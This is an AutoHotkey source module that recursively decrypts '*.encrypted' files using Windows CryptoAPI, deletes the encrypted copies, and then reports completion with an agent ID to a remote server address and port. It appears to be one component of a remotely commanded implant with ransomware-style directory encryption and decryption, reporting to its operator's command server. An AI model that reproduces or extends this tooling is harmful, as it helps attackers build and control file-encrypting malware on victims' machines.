; ============================================================================
; DECRYPT DIRECTORY MODULE
; ============================================================================
; Decrypts previously encrypted files using Windows CryptoAPI
; ============================================================================

DecryptDirectory(targetFolder, password) {

    Decrypt(encryptedBuffer, password) {
        ; Create crypto provider and hash
        hProvider := Buffer(A_PtrSize)
        if !(DllCall("Advapi32\CryptAcquireContext", "Ptr", hProvider.Ptr, "Ptr", 0, "Ptr", 0, "UInt", 1, "UInt", 0xF0000000))
            throw Error("Failed to acquire crypto context", -1)

        hHash := Buffer(A_PtrSize)
        if !(DllCall("Advapi32\CryptCreateHash", "Ptr", NumGet(hProvider, 0, "Ptr"), "UInt", 0x8003, "Ptr", 0, "UInt", 0, "Ptr", hHash.Ptr))
            throw Error("Failed to create hash", -1)

        ; Hash the password
        pwSize := StrPut(password, "UTF-8") - 1
        pwBuffer := Buffer(pwSize)
        StrPut(password, pwBuffer, "UTF-8")

        if !DllCall("Advapi32\CryptHashData", "Ptr", NumGet(hHash, 0, "Ptr"), "Ptr", pwBuffer.Ptr, "UInt", pwSize, "UInt", 0)
            throw Error("Failed to hash password", -1)

        ; Create decryption key
        hKey := Buffer(A_PtrSize)
        if !(DllCall("Advapi32\CryptDeriveKey", "Ptr", NumGet(hProvider, 0, "Ptr"), "UInt", 0x6801, "Ptr", NumGet(hHash, 0, "Ptr"), "UInt", 1, "Ptr", hKey.Ptr))
            throw Error("Failed to create key", -1)

        ; Decrypt the data
        decryptedSize := encryptedBuffer.Size
        decrypted := Buffer(decryptedSize)
        decrypted.Size := decryptedSize
        decrypted := encryptedBuffer

        if !DllCall("Advapi32\CryptDecrypt", "Ptr", NumGet(hKey, 0, "Ptr"), "Ptr", 0, "Int", 1, "UInt", 0, "Ptr", decrypted.Ptr, "UInt*", &decryptedSize)
            throw Error("Decryption failed", -1)

        ; Clean up
        DllCall("Advapi32\CryptDestroyKey", "Ptr", NumGet(hKey, 0, "Ptr"))
        DllCall("Advapi32\CryptDestroyHash", "Ptr", NumGet(hHash, 0, "Ptr"))
        DllCall("Advapi32\CryptReleaseContext", "Ptr", NumGet(hProvider, 0, "Ptr"), "UInt", 0)

        decrypted.Size := decryptedSize
        return decrypted
    }

    Loop Files, targetFolder "\*.encrypted", "FR"
    {
        this.Log("Processing: " A_LoopFileName "`n")

        ; Read the encrypted file
        fileObj := FileOpen(A_LoopFileFullPath, "r-d")
        if !fileObj {
            this.Log("Failed to open file`n")
            continue
        }

        fileSize := fileObj.Length
        if (fileSize <= 0) {
            this.Log("Invalid file size for: " A_LoopFileName "`n")
            fileObj.Close()
            continue
        }

        encryptedBuffer := Buffer(fileSize)
        if (!encryptedBuffer) {
            this.Log("Failed to create buffer for: " A_LoopFileName "`n")
            fileObj.Close()
            continue
        }

        if (!fileObj.RawRead(encryptedBuffer)) {
            this.Log("Failed to read file: " A_LoopFileName "`n")
            fileObj.Close()
            continue
        }

        fileObj.Close()

        try {
            ; Remove .encrypted from the path
            newPath := SubStr(A_LoopFileFullPath, 1, -10)

            ; Decrypt the data
            decryptedData := Decrypt(encryptedBuffer, password)

            ; Write the decrypted data
            fileObj := FileOpen(newPath, "w-d")
            if fileObj {
                fileObj.RawWrite(decryptedData, decryptedData.Size)
                fileObj.Close()
                FileDelete(A_LoopFileFullPath)
                this.Log("Successfully decrypted to: " newPath "`n")
            }
        } catch Error as err {
            this.Log("Error: " err.Message "`n")
        }
    }
    message := Format("command_output|{}|Decryption completed.", this.agentID)
    response := this.SendMsg(this.serverIP, this.serverPort, message)
}
